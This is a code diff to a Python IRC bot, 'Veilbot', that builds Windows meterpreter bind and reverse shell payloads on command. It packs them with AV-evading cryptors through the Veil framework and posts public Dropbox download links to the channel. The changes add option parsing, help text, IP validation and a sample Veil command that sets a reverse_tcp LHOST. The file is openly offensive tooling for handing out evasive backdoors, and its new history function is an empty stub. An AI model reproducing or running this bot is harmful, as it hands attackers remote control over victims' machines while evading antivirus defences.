@@ -10,6 +10,7 @@ meterpreter backdoors.
 '''
 
 
+import re
 import os
 import sys
 import time
@@ -60,6 +61,7 @@ class ChannelSettings(object):
         return self.name
 
 
+### Command parsers3
 class IRCArgumentParser(ArgumentParser):
     
     def error(self, message):
@@ -68,29 +70,33 @@ class IRCArgumentParser(ArgumentParser):
 
 
 # Reverse shell parser
-reverseShellParser = IRCArgumentParser()
-reverseShellParser.add_argument('--lhost',
+reverseShellParser = IRCArgumentParser(add_help=False)
+reverseShellParser.add_argument('--lhost', '-lhost',
     dest='lhost',
     required=True,
 )
-reverseShellParser.add_argument('--lport',
+reverseShellParser.add_argument('--lport', '-lport',
     dest='lport',
     default="4444",
 )
-reverseShellParser.add_argument('--protocol',
+reverseShellParser.add_argument('--protocol', '-p',
     dest='protocol',
     default="tcp",
 )
-reverseShellParser.add_argument('--cryptor',
+reverseShellParser.add_argument('--cryptor', '-c',
     dest='cryptor',
     default='AESVirtualAlloc',
 )
 
 # Bind shell parser
-bindShellParser = IRCArgumentParser()
+bindShellParser = IRCArgumentParser(add_help=False)
 bindShellParser.add_argument('--lport',
     dest='lport',
     default="4444",
+)
+bindShellParser.add_argument('--protocol', '-p',
+    dest='protocol',
+    default="tcp",
 )
 bindShellParser.add_argument('--cryptor',
     dest='cryptor',
@@ -250,6 +256,7 @@ class Veilbot(irc.IRCClient):
         self.msg(display_channel, message.encode('ascii', 'ignore'))
 
     def get_user(self, nick):
+        ''' Get user from database, create new user if none exists '''
         user = User.by_nick(nick)
         if user is None:
             logging.info("Creating new user '%s'" % nick)
@@ -259,9 +266,16 @@ class Veilbot(irc.IRCClient):
         return user
 
     def validate_ip_address(self, ip):
+        ''' 
+        Validate an ip address, remove any unwanted chars 
+        TODO: Add support for domain/host names, etc
+        '''
         ip_address = filter(lambda char: char in '1234567890.', ip)
-        if 0 < len(ip_address) <= len("255.255.255.255"):
-            return ip_address
+        ip_regex = re.compile(
+            r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
+        )
+        if 0 < len(ip_address):
+            return ip_address if ip_regex.match(ip_address) else None
         else:
             return None
 
@@ -274,55 +288,92 @@ class Veilbot(irc.IRCClient):
 
     # Actual commands
     def bind(self, user, channel, msg):
-        ''' Create a bind shell '''
+        ''' Ugly command input validation code '''
+        msfpayload = 'windows/meterpreter/bind_'
+        msfoptions = []
         try:
-            args = bindShellParser.parse_args(msg.split())
-            # Check lport
-            if self.validate_port(args.lport):
-                msfoptions.append("LPORT=%s" % args.lport)
+            if msg.strip() in ['-h', '--help', '-help']:
+                self.display(user, channel, "   Command help !bind ~ Generate a bind meterpreter shell   ")
+                self.display(user, channel, "============================================================")
+                self.display(user, channel, "   --lport: Connect back listen port (default: 4444)")
+                self.display(user, channel, "--protocol: Shell protocol %s (default: tcp)" % self.protocols)
+                self.display(user, channel, " --cryptor: Shell packer %s (default: AESVirtualAlloc)" % self.cryptors)
+                self.display(user, channel, "============================================================")
             else:
-                raise ValueError("Invalid lport number")
-            fpath = self.__generate__(args)
-            #url = self.__dropbox__(fpath)
-            #self.display(user, channel, "Shell Download: %s" % (url,))
+                args = bindShellParser.parse_args(msg.split())
+                # Check protocol
+                if args.protocol in self.protocols:
+                    msfpayload += args.protocol
+                else:
+                    raise ValueError("Invalid protocol")
+                # Check lport
+                if self.validate_port(args.lport):
+                    msfoptions.append("LPORT=%s" % args.lport)
+                else:
+                    raise ValueError("Invalid lport number")
+                # Check cryptors
+                if args.cryptor in self.cryptors:
+                    cryptor = args.cryptor
+                else:
+                    raise ValueError("Invalid cryptor")
+                file_path = self.__generate__(
+                    msfpayload, 
+                    msfoptions, 
+                    cryptor, 
+                    'bind_' + args.protocol
+                )
+                url = self.__dropbox__(user, file_path)
+                self.display(user, channel, "Shell Download: %s" % (url,))
         except ValueError as error:
-            self.display(user, channel, "Error: %s" % str(error))
+            self.display(user, channel, "Error: %s" % error)
 
     def reverse(self, user, channel, msg):
-        ''' Create a reverse shell '''
+        ''' Ugly command input validation code '''
         msfpayload = 'windows/meterpreter/reverse_'
         msfoptions = []
         try:
-            args = reverseShellParser.parse_args(msg.split())
-            # Check protocol
-            if args.protocol in self.protocols:
-                msfpayload += args.protocol
+            if msg.strip() in ['-h', '--help', '-help']:
+                self.display(user, channel, "Command help !reverse ~ Generate a reverse meterpreter shell")
+                self.display(user, channel, "============================================================")
+                self.display(user, channel, "   --lhost: Connect back ip address (required)")
+                self.display(user, channel, "   --lport: Connect back listen port (default: 4444)")
+                self.display(user, channel, "--protocol: Shell protocol %s (default: tcp)" % self.protocols)
+                self.display(user, channel, " --cryptor: Shell packer %s (default: AESVirtualAlloc)" % self.cryptors)
+                self.display(user, channel, "============================================================")
             else:
-                raise ValueError("Invalid protocol")
-            # Check lport
-            if self.validate_port(args.lport):
-                msfoptions.append("LPORT=%s" % args.lport)
-            else:
-                raise ValueError("Invalid lport number")
-            # Check lhost
-            ip_address = self.validate_ip_address(args.lhost)
-            if ip_address is not None:
-                msfoptions.append("LHOST=%s" % ip_address)
-            else:
-                raise ValueError("Invalid lhost ip address")
-            # Check cryptors
-            if args.cryptor in self.cryptors:
-                cryptor = args.cryptor
-            else:
-                raise ValueError("Invalid cryptor")
-            self.display(user, channel, "Generating payload, please wait ...")
-            # Flush buffers?
-            file_path = self.__generate__(msfpayload, msfoptions, cryptor)
-            url = self.__dropbox__(user, file_path)
-            self.display(user, channel, "Shell Download: %s" % (url,))
+                args = reverseShellParser.parse_args(msg.split())
+                # Check protocol
+                if args.protocol in self.protocols:
+                    msfpayload += args.protocol
+                else:
+                    raise ValueError("Invalid protocol")
+                # Check lport
+                if self.validate_port(args.lport):
+                    msfoptions.append("LPORT=%s" % args.lport)
+                else:
+                    raise ValueError("Invalid lport number")
+                # Check lhost
+                ip_address = self.validate_ip_address(args.lhost)
+                if ip_address is not None:
+                    msfoptions.append("LHOST=%s" % ip_address)
+                else:
+                    raise ValueError("Invalid lhost ip address")
+                # Check cryptors
+                if args.cryptor in self.cryptors:
+                    cryptor = args.cryptor
+                else:
+                    raise ValueError("Invalid cryptor")
+                file_path = self.__generate__(
+                    msfpayload, 
+                    msfoptions, 
+                    cryptor, 
+                    'reverse_' + args.protocol
+                )
+                url = self.__dropbox__(user, file_path)
+                self.display(user, channel, "Shell Download: %s" % (url,))
         except ValueError as error:
             self.display(user, channel, "Error: %s" % error)
-    
+        
 #./Veil.py 
 # -l python 
 # -p AESVirtualAlloc 
@@ -330,7 +381,7 @@ class Veilbot(irc.IRCClient):
 # --msfpayload windows/meterpreter/reverse_tcp 
 # --msfoptions LHOST=192.168.1.1 LPORT=443
 
-    def __generate__(self, msfpayload, msfoptions, cryptor, language='python'): 
+    def __generate__(self, msfpayload, msfoptions, cryptor, name, language='python'): 
         ''' Gerenate shell with args '''
         logging.debug("msfpayload: %s" % msfpayload)
         logging.debug("msfoptions: %s" % msfoptions)
@@ -339,7 +390,7 @@ class Veilbot(irc.IRCClient):
         options = {}
         options['msfvenom'] = [msfpayload, msfoptions]
         controller.SetPayload(language, cryptor, options)
-        file_name = "veil"
+        file_name = name + "_veil"
         file_path = controller.OutputMenu(
             controller.payload, 
             controller.GeneratePayload(), 
@@ -350,7 +401,10 @@ class Veilbot(irc.IRCClient):
         return file_path
 
     def __dropbox__(self, user, output):
-        ''' Get public dropbox link '''
+        ''' 
+        Get public dropbox link 
+        TODO: Use the actual dropbox api
+        '''
         file_name = os.path.basename(output)
         extension = self.share_lpath +'/'+ user.uuid + '/'
         dst_path = self.dropbox_lpath + '/' + extension
@@ -368,7 +422,11 @@ class Veilbot(irc.IRCClient):
 
     def history(self, user, channel, msg):
         ''' Retrieve a user's history '''
-        user = User.by_nick(user)
+        if 0 < len(user.history):
+            for payload in user.history:
+                pass
+        else:
+            self.display(user, channel, "No history for '%s'" % user)
 
     def help(self, user, channel, msg):
         ''' Displays a helpful messages '''
@@ -377,6 +435,8 @@ class Veilbot(irc.IRCClient):
         self.display(user, channel, "    !bind: Create a bind shell ")
         self.display(user, channel, " !reverse: Create a reverse shell")
         self.display(user, channel, " !history: View you previously generated shells")
+        self.display(user, channel, " ")
+        self.display(user, channel, "For more details add --help to a command above.")
 
 
 ### Factory
@@ -399,7 +459,7 @@ class VeilbotFactory(protocol.ClientFactory):
 
     def clientConnectionFailed(self, connector, reason):
         ''' When connection fails '''
-        logging.warn("Connection failed: " + str(reason))
+        logging.warn("Connection failed: %s" % reason)
         reactor.stop()
 
 ### Main
